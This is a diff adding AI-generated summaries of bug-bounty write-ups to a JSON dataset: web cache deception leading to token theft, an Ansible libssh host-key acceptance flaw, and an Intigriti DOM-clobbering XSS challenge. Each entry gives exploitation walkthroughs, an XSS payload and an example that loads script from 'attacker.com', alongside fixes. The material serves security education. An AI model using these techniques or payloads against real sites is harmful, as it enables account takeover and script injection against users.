@@ -1,5 +1,87 @@
 [
   {
+    "id": "1637618db515",
+    "title": "How a Cache Keys Mismatch Led to a Web Cache Deception Account Takeover",
+    "url": "https://medium.com/@t4nv1/how-a-cache-keys-mismatch-led-to-a-web-cache-deception-account-takeover-1b8e934e522a",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "T4nv1"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-14T08:16:01.000Z",
+    "added_at": "2026-11-14T09:33:51.169Z",
+    "categories": [
+      "access-control",
+      "other"
+    ],
+    "severity": "critical",
+    "difficulty": "intermediate",
+    "summary_en": "A URL normalization discrepancy between NGINX and a Node.js backend allowed attackers to trick the cache into storing sensitive API tokens by appending static file extensions to dynamic endpoints.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The root cause is a mismatch in how two different servers interpret the same URL (web address). The NGINX reverse proxy (a middleman server) was configured to cache any response if the URL ended in static extensions like .css or .js. However, the Node.js origin server (the main application server) was configured to ignore these extensions or treat them as part of the path, still serving private user data. This discrepancy meant NGINX would see a 'static' file and save the private response in its public cache, making it accessible to anyone who visited that specific URL.",
+      "walkthrough": "RECONNAISSANCE\n1. Identify that the target uses NGINX as a reverse proxy (a server that sits in front of web servers and forwards client requests).\n2. Identify the backend as a Node.js server using Express.js (a framework for building web applications).\n\nDISCOVERY\n3. Observe that NGINX is configured to aggressively cache static assets (files that do not change, like images or scripts) to reduce server load.\n4. Note the specific file extensions NGINX is programmed to cache: .css, .js, .jpg, .png, and .svg.\n5. Identify a dynamic endpoint ( a URL that generates unique data for each user) that returns sensitive information, such as API tokens (secret keys used to prove a user's identity).\n\nEXPLOITATION\n6. Understand that a 'normalization discrepancy' exists, meaning the two servers clean up or read the URL differently.\n7. The attacker crafts a URL that points to a sensitive endpoint but ends with one of the cached extensions.\n8. The attacker tricks a logged-in victim into clicking this crafted link.\n9. The victim's browser sends an HTTP request (a message asking for data) to the proxy.\n10. NGINX receives the request and sees the static extension (e.g., .css) at the end of the URL.\n11. NGINX forwards the request to the Node.js origin server (the server where the application code actually runs).\n12. The Node.js server processes the request, ignores the fake extension, and returns the victim's private API tokens in the response.\n13. NGINX receives this response and, because the URL ends in .css, it saves (caches) the private data in its public storage.\n\nIMPACT\n14. The attacker now visits the exact same URL used by the victim.\n15. NGINX finds the 'cached' version of the page and serves the victim's private API tokens directly to the attacker.\n16. The attacker uses these tokens to achieve full Account Takeover (gaining complete control of the victim's account).",
+      "example": "Imagine a website where your profile is at 'target.example/api/me'. The site uses a proxy that caches anything ending in '.jpg'. \n\n1. An attacker sends a victim a link: 'https://target.example/api/me/avatar.jpg'.\n2. The victim, logged in, clicks the link. \n3. The backend server sees '/api/me' and ignores the '/avatar.jpg' part, returning the victim's private profile data (email, password hash).\n4. The proxy sees '.jpg' and thinks 'This is a public image!' and saves the profile data in its cache.\n5. The attacker visits 'https://target.example/api/me/avatar.jpg' and the proxy gives them the victim's private data from the cache. \n\nThis works because the proxy and the backend don't agree on what the URL actually means.",
+      "takeaway": "When hunting for Web Cache Deception, look for discrepancies in how proxies and origin servers handle path delimiters (like semicolons, dots, or slashes). Test if appending a fake extension like '/test.css' to a sensitive endpoint still returns the sensitive data while also triggering a cache header like 'X-Cache: HIT'. A common variant involves using encoded characters (like %23 for #) that the proxy ignores but the backend uses to truncate the path. Avoid the mistake of assuming that 'Cache-Control: public' is the only way things get cached; many proxies cache based on file extensions regardless of headers if misconfigured.",
+      "fix": "To fix this, ensure that the reverse proxy only caches files from specific, trusted static directories (like /static/ or /assets/) rather than relying on file extensions alone. Additionally, the application should explicitly send the 'Cache-Control: no-store' or 'Cache-Control: private' header on all responses containing sensitive data to prevent any intermediary from saving it. \n\nExample fix in Express.js:\napp.use('/api', (req, res, next) => {\n  res.set('Cache-Control', 'no-store, private, must-revalidate');\n  next();\n});",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "Web Cache Deception (WCD) occurs when an intermediary caching layer — such as a Content Delivery Network (CDN) or reverse proxy — stores a response containing sensitive user data because it misinterprets a dynamic request as static content. Unlike traditional Web Cache Poisoning, where an attacker injects malicious content into the cache to serve to other users, Web Cache Deception tricks the victim’s browser into making a request that causes the proxy to cache the victim’s private account data under a publicly accessible URL. In this write-up, we will analyze a scenario where a URL normalizat",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 60
+  },
+  {
+    "id": "fa4aaf1cb9b8",
+    "title": "When “Trust On First Use” Trusts the Second Key Too",
+    "url": "https://medium.com/@aleens09/cve-2026-126641-when-trust-on-first-use-trusts-the-second-key-too-a244cfb8e109",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Aleens-labs"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-14T07:40:54.000Z",
+    "added_at": "2026-11-14T09:34:07.535Z",
+    "categories": [
+      "access-control",
+      "auth-bypass"
+    ],
+    "severity": "medium",
+    "difficulty": "intermediate",
+    "summary_en": "Ansible's libssh transport incorrectly accepts changed SSH host keys when the 'host_key_auto_add' option is enabled, allowing Man-in-the-Middle attackers to intercept credentials.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The vulnerability stems from a 'lossy' library binding in pylibssh where three distinct SSH states (Unknown, Changed, and Other) were collapsed into a single 'missing_host_key' function. While the original design this was based on (Paramiko) only called this function for truly new hosts, pylibssh triggered it for modified keys as well. Ansible's implementation then treated any call to this function as a signal to automatically trust and save the key, effectively disabling the security check meant to detect server impersonation.",
+      "walkthrough": "RECON\n1. The researcher monitors security mailing lists for 'variant hunting'—looking for similar mistakes in different software.\n2. They identify a pattern where language bindings (code that lets Python talk to C libraries) lose detail when reporting security errors.\n\nDISCOVERY\n3. The researcher examines the 'ansible-pylibssh' source code and finds a mapping dictionary:\nKNOW_HOST_MSG_MAP = { libssh.SSH_KNOWN_HOSTS_CHANGED: \"Host key for server has changed: \", ... }\nWhy: This shows the library treats a 'Changed' key (potential attack) the same way it treats an 'Unknown' key (new server).\n4. They find the 'verify_knownhost' function which passes these different states to a single hook called 'missing_host_key'.\n\nEXPLOITATION\n5. The researcher sets up a local SSH server (a program that allows secure remote login) on 127.0.0.1:2222.\n6. They perform 'Run 1' where the server presents 'Host Key A' (a unique digital fingerprint identifying the server).\n7. They perform 'Run 2' after replacing 'Host Key A' with 'Host Key B' to simulate an attacker intercepting the connection.\n8. They configure Ansible with the following environment variable:\nANSIBLE_LIBSSH_HOST_KEY_AUTO_ADD=true\nWhy: This setting tells Ansible to automatically accept and save new host keys without asking the user.\n9. They run an Ansible playbook (a script that automates tasks on remote servers) against the modified server.\n\nIMPACT\n10. Ansible connects to the server with 'Host Key B' without showing any warning to the user.\n11. The researcher checks the server logs and confirms the connection was successful:\nAccepted password for the controller's user\nWhy: This proves the 'interceptor' server successfully received the user's secret password because the host key check failed to stop the connection.",
+      "example": "Imagine a fictional tool called 'CloudSync' that manages remote servers. It has a feature 'TrustNewServers=True'. Internally, it uses a library that returns 'Error Code 1' for a brand new server and 'Error Code 2' for a server whose identity has changed. However, CloudSync's code looks like this: if (errorCode != 0) { saveKeyToDisk(); continueConnection(); }. An attacker sits between CloudSync and the real server, presenting a fake identity. Because CloudSync sees 'Error Code 2' as just 'not zero', it saves the attacker's fake identity as the 'new' truth and sends the login password directly to the attacker.",
+      "takeaway": "When hunting for bugs, look for 'wrapper' libraries that simplify complex security states into a single 'success/fail' or 'missing' category. This 'lossy' translation often hides critical security warnings like key mismatches. Always test 'Auto-Add' or 'Easy-Onboarding' features in automation tools, as they frequently prioritize convenience over the 'Trust On First Use' (TOFU) security model. A common mistake is assuming that 'Auto-Add' only applies to the very first connection; always verify if it also triggers when an existing key changes.",
+      "fix": "The fix requires modifying the library to distinguish between 'Unknown' and 'Changed' states. The 'Auto-Add' logic should only execute if the host is completely unknown. If a key exists but does not match, the connection must be hard-refused to prevent Man-in-the-Middle attacks. Users should mitigate this by disabling 'host_key_auto_add' and manually pre-populating their 'known_hosts' file with verified keys. \n\n# Example of a safer logic check:\nif state == libssh.SSH_KNOWN_HOSTS_UNKNOWN:\n    if auto_add:\n        save_key()\n    else:\n        prompt_user()\nelif state == libssh.SSH_KNOWN_HOSTS_CHANGED:\n    raise SecurityError('Host key mismatch! Possible interception.')",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "Ansible’s libssh transport accepts a **changed** SSH host key when its trust-on-first-use option is enabled. The controller logs in to whoever answers, runs the playbook there, and saves the new key. No warning is shown. Red Hat Product Security confirmed the issue and assigned **CVE-2026–126641**. * **Affected:**`ansible-pylibssh` and the `ansible.netcommon` libssh connection plugin, including `network_cli` when it uses libssh * **Class:** CWE-322, Key Exchange without Entity Authentication * **Severity:** Moderate, CVSS 3.1 score 6.5 (`AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N`) * **Not affected:*",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 47
+  },
+  {
     "id": "95a142fa7927",
     "title": "Account Takeover via Password Reset Poisoning (X-Forwarded-Host)",
     "url": "https://medium.com/@m.elsaidy35/account-takeover-via-password-reset-poisoning-x-forwarded-host-3456af71dbc9",
@@ -648,6 +730,46 @@
       "fix_ar": null
     },
     "excerpt": "W hile browsing a target Web application, I clicked on the **Shodan Browser Extension** to view quick context on the server stack, open ports, and potential known vulnerabilities associated with the host’s infrastructure. ## Get Adarsh S Nair’s stories in your inbox Join Medium for free to get updates from this writer. Subscribe Subscribe - [x] Remember me for faster sign in Among the listed technologies and CVE findings, one specific entry caught my attention: **CVE-2021–44528**. ## What is CVE-2021–44528? In Ruby on Rails (Action Pack versions `>= 6.0.0`), the framework implements Host Autho",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 47
+  },
+  {
+    "id": "9827fd81ef45",
+    "title": "🏁 Intigriti BRP Challenge Write-up",
+    "url": "https://medium.com/@laftman/intigriti-brp-challenge-write-up-187eded7dfe9",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "⛧ Ⱡ₳₣₮M₳₦⛧"
+    ],
+    "program": null,
+    "platform_slug": "intigriti",
+    "bounty_raw": null,
+    "published_at": "2026-11-10T11:17:03.000Z",
+    "added_at": "2026-11-14T09:34:40.033Z",
+    "categories": [
+      "xss"
+    ],
+    "severity": "medium",
+    "difficulty": "intermediate",
+    "summary_en": "A reflected XSS vulnerability was discovered where an incomplete HTML sanitizer allowed an attacker to inject specific DOM elements that bypassed internal security gates, leading to arbitrary script execution and flag theft.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The vulnerability stems from a 'denylist' approach to security, where the application only blocked specific dangerous tags like <script> and event attributes like 'onerror'. It failed to account for the fact that 'id' and 'data-*' attributes could be used to manipulate the application's own logic. Because the application used the DOM (the browser's internal map of the page) to store security-sensitive configuration, an attacker could inject harmless-looking HTML that the application then used to programmatically load a malicious script.",
+      "walkthrough": "RECON\n1. The researcher identified the 'person' parameter in the URL, which is a piece of data sent to the website in the address bar.\nhttps://challenge-brp.challenges.intigriti.io/challenge.php?person=test\nWhy: This is the entry point for user input. (A parameter is a variable in a URL used to pass data).\n2. They observed that the input is placed into a 'sink' called innerHTML, which is a programming command that tells the browser to treat text as HTML code.\nholder.innerHTML = sanitizedValue;\nWhy: Using innerHTML is dangerous because it tells the browser to execute any code found in the string. (A sink is a function that can execute or render data).\n\nDISCOVERY\n3. The researcher tested if they could inject a simple bold tag to see if it rendered.\nhttps://challenge-brp.challenges.intigriti.io/challenge.php?person=<b>probe</b>\nWhy: This confirms the application treats the input as HTML (the language used to build web pages) rather than plain text.\n4. They tried a standard script tag to run JavaScript, but it was removed by a sanitizer, which is a filter that removes dangerous parts from user input.\n<script>alert(1)</script>\nWhy: The sanitizer uses a denylist to block specific tags like <script> (an HTML element used to run code).\n5. They analyzed the page's source code to find the 'gate' logic that controls script loading.\nconst latch = document.getElementById('archive-latch');\nWhy: The application looks for specific elements in the DOM to decide what to do next. (The DOM is the browser's internal map of the webpage).\n6. They found a check for a 'data-key' attribute, which is a custom setting inside an HTML tag.\nif (latch.dataset.key === 'river-lantern')\nWhy: The application only proceeds if an element with a specific ID and a specific data value exists.\n7. They found a second check for an element with the ID 'record-anchor' and a 'data-index' attribute.\nconst anchor = document.getElementById('record-anchor');\nWhy: This is a second security gate that must be passed simultaneously.\n8. They discovered that if both gates pass, the application creates a new script tag using the value from 'data-index'.\nconst s = document.createElement('script'); s.src = anchor.dataset.index;\nWhy: This is the final exploit point; the application trusts the 'data-index' value to be a safe URL.\n\nEXPLOITATION\n9. The researcher crafted the first required element (the latch) with the correct ID and key.\n<div id=\"archive-latch\" data-key=\"river-lantern\"></div>\nWhy: This satisfies the first security check without using any blocked tags.\n10. They crafted the second element (the anchor) pointing to a malicious endpoint, which is a specific URL on a server.\n<a id=\"record-anchor\" data-index=\"/echo.php?listener=alert(document.domain)\"></a>\nWhy: This satisfies the second check and provides the payload (the malicious code) to be loaded.\n11. They combined both elements into a single payload to bypass both gates at once.\n<div id=\"archive-latch\" data-key=\"river-lantern\"><a id=\"record-anchor\" data-index=\"/echo.php?listener=alert(document.domain)//\"></a></div>\nWhy: This payload contains only allowed tags and attributes, so the sanitizer lets it through.\n\nIMPACT\n12. The researcher loaded the final URL in the browser.\nhttps://challenge-brp.challenges.intigriti.io/challenge.php?person=[PAYLOAD]\nWhy: The browser renders the injected HTML, the application's logic sees the required elements, and it automatically loads the attacker's script.\n13. The script executed in the browser, triggering an alert and revealing the secret flag.\nalert(document.domain)\nWhy: This proves the attacker has full control over the website's behavior in the victim's browser.",
+      "example": "Imagine a website 'target.example' that lets you customize your profile header. It filters out <script> tags but allows <div> tags with IDs. The site has a 'theme loader' script that looks for an element with id='theme-config' and loads a file from its 'data-path' attribute. A vulnerable code snippet might look like: \n\nconst config = document.getElementById('theme-config');\nif (config) {\n  let script = document.createElement('script');\n  script.src = config.getAttribute('data-path');\n  document.body.appendChild(script);\n}\n\nAn attacker can bypass the script filter by providing this input: \n<div id='theme-config' data-path='//attacker.com/evil.js'></div>\n\nWhen the page loads, the 'theme loader' finds the attacker's <div>, reads the 'data-path', and helpfully loads the attacker's malicious JavaScript file.",
+      "takeaway": "When hunting for XSS, don't just look for blocked tags; look for how the application uses the HTML you *can* inject. If an application uses a denylist (blocking specific 'bad' things), it is almost always bypassable. Pay close attention to 'data-*' attributes and 'id' attributes, as these are often used by legitimate scripts to make decisions. A common beginner mistake is giving up when <script> or onerror is blocked, instead of reading the site's own JavaScript to see if you can 'clobber' or manipulate its logic using allowed tags.",
+      "fix": "The best fix is to avoid using innerHTML entirely and instead use textContent, which treats all input as literal text and never executes it as code. If you must render HTML, use a robust, allowlist-based library like DOMPurify that only allows a very narrow set of safe tags and attributes. Additionally, never use the DOM as a source of truth for security-sensitive data like script URLs. \n\nFixed code example:\n// Use textContent for safety\nholder.textContent = userInput;\n\n// Or use a proper sanitizer if HTML is required\nholder.innerHTML = DOMPurify.sanitize(userInput);",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "**Target:**`challenge-brp.challenges.intigriti.io`**Vulnerability class:** CWE-79 — Improper Neutralization of Input During Web Page Generation (Cross-Site Scripting) **Severity:** Medium **Result:** Reflected XSS leading to disclosure of the challenge flag ## 📋 Summary The `person` parameter of `challenge.php` is reflected into the DOM via `innerHTML` after a sanitization pass that strips dangerous tags and `on*` event attributes, but does not strip ordinary HTML elements or their data attributes. By studying the page's own client-side logic, it was possible to construct a payload built enti",
     "ai_generated": true,
     "engagement": null,
     "score": 47
